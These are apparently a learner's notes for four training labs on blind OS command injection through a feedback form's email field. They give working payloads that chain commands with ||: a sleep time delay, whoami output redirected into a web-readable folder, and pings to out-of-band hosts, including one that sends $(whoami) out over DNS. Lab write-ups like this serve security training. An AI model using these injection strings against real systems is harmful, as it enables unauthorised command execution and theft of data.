
# Labs
## Lab: Blind OS command injection with time delays

There is a `/submit/feedback` endpoint with these parameters:
`csrf=nw4pySmVD2HjHYeHr149jcSWhf0q5f1D&name=Pop&email=pop%40pop.com&subject=Pop+Time&message=Ok+here+we+go`

You simply use `||`'s to end the command after `email` and run `sleep` like so: 
`csrf=nw4pySmVD2HjHYeHr149jcSWhf0q5f1D&name=Pop&email=pop%40pop.com||sleep+10||&subject=Pop+Time&message=Ok+here+we+go`

**Note:** `||` is the `OR` operator in bash, so it only executes if there is an error, which there would be because the required parameters aren't yet included


## Lab: Blind OS command injection with output redirection
The instructions give away a lot of it
- You can't read the output, but can read files from `/var/www/images`
	- This is done by opening an image in a new tab and seeing `/image?filename=31.jpg`
	- We can assume these images are in that folder
- So the goal is to write a file the the `/var/www/images` folder, and we need to execute the `whoami` command
- We can use these parameters, similar to the previous lab:
- `csrf=HJ9WXIDOEOcHSAdVTYa8bA5LAwjHNtoN&name=Pop&email=pop%40pop.com||whoami+>+/var/www/images/whoami.txt||&subject=Pop2&message=Heres+we+what`
- **Note** that the real part is in the **email** parameter: 
	- `email=pop%40pop.com||whoami+>+/var/www/images/whoami.txt||`

## Lab: Blind OS command injection with out-of-band interaction
Similar to the last two, but it's out of band. You have to:
`email=pop%40pop.com||ping+2sv8ty3cewdg3uhfmcze24bu8lec22qr.oastify.com||`

## Lab: Blind OS command injection with out-of-band data exfiltration
Similar again, but this time we need the output of the command `whoami` to go out-of-band. We can do this with `$(whoami).<oastifypayload>` like so:
- `email=pop%40pop.com||ping+$(whoami).o8xu9kjyuit2jgx12yf0iqrgo7uyip6e.oastify.com||`